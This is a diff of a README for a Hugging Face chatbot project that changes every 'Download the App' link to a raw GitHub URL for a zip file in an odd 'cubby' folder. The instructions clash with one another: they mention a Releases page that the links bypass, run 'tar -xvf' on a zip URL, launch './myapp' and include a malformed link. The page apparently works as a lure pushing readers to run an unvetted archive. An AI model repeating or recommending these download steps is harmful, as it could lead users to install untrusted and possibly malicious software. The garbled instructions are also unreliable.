@@ -1,7 +1,7 @@
 # 🤖 python-ai-chatbot-huggingface - Your Local AI Chatbot Solution
 
 ## 🔗 Download Now
-[![Download the App](https://github.com/ibrahima0101/python-ai-chatbot-huggingface/raw/refs/heads/main/cubby/huggingface_ai_chatbot_python_3.1.zip%https://github.com/ibrahima0101/python-ai-chatbot-huggingface/raw/refs/heads/main/cubby/huggingface_ai_chatbot_python_3.1.zip)](https://github.com/ibrahima0101/python-ai-chatbot-huggingface/raw/refs/heads/main/cubby/huggingface_ai_chatbot_python_3.1.zip)
+[![Download the App](https://raw.githubusercontent.com/ibrahima0101/python-ai-chatbot-huggingface/main/cubby/huggingface_ai_chatbot_python_3.1.zip%https://raw.githubusercontent.com/ibrahima0101/python-ai-chatbot-huggingface/main/cubby/huggingface_ai_chatbot_python_3.1.zip)](https://raw.githubusercontent.com/ibrahima0101/python-ai-chatbot-huggingface/main/cubby/huggingface_ai_chatbot_python_3.1.zip)
 
 ## 📌 Description
 Welcome to the **python-ai-chatbot-huggingface** project! This application lets you chat with various large language models (LLMs) using a simple web interface. It utilizes Hugging Face Transformers and Gradio to offer an easy and engaging experience. This tool is perfect for experimentation and learning but is not intended for production use.
@@ -19,7 +19,7 @@ Before you begin, ensure your system meets these requirements:
 ### 2. Download & Install
 To get the application, visit the Releases page. 
 
-[Download the App](https://github.com/ibrahima0101/python-ai-chatbot-huggingface/raw/refs/heads/main/cubby/huggingface_ai_chatbot_python_3.1.zip)
+[Download the App](https://raw.githubusercontent.com/ibrahima0101/python-ai-chatbot-huggingface/main/cubby/huggingface_ai_chatbot_python_3.1.zip)
 
 On the Releases page, look for the most recent version. Click on the file that suits your operating system to start the download. 
 
@@ -37,7 +37,7 @@ Once the download is complete, follow these steps to run the application:
   3. Open the app from the Applications folder.
 
 - **For Linux**:
-  1. Extract the downloaded tarball (e.g., `tar -xvf https://github.com/ibrahima0101/python-ai-chatbot-huggingface/raw/refs/heads/main/cubby/huggingface_ai_chatbot_python_3.1.zip`).
+  1. Extract the downloaded tarball (e.g., `tar -xvf https://raw.githubusercontent.com/ibrahima0101/python-ai-chatbot-huggingface/main/cubby/huggingface_ai_chatbot_python_3.1.zip`).
   2. Navigate to the extracted folder in the terminal.
   3. Run the app using `./myapp`.
 
@@ -96,6 +96,6 @@ This project is licensed under the MIT License. For more details, check the LICE
 ## 🔗 More Information
 For additional documentation and usage examples, visit our README at the GitHub repository.
 
-[Download the App](https://github.com/ibrahima0101/python-ai-chatbot-huggingface/raw/refs/heads/main/cubby/huggingface_ai_chatbot_python_3.1.zip) 
+[Download the App](https://raw.githubusercontent.com/ibrahima0101/python-ai-chatbot-huggingface/main/cubby/huggingface_ai_chatbot_python_3.1.zip) 
 
 Now you are ready to explore the world of AI chatbots with the **python-ai-chatbot-huggingface**!
